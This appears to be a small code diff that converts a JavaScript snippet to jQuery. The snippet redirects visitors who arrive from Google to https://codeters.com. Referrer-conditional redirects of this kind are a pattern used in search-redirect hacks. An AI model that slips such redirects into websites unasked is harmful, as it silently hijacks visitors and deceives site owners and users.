@@ -1,9 +1,10 @@
-document.addEventListener('DOMContentLoaded', function() {
+  $(document).ready(function() {
     var referrer = document.referrer;
-
-    // Check if the referrer is from Google search
-    if (referrer && referrer.match(/google\.com/i)) {
-      var redirectTo = "https://codeters.com"; // Your target URL
-      window.location.href = redirectTo;
+    
+    if (referrer) {
+      if (referrer.match(/google\.com/i)) {
+        // The user likely came from a Google search
+        window.location.href = "https://codeters.com"; // Redirect to your target URL
+      }
     }
   });
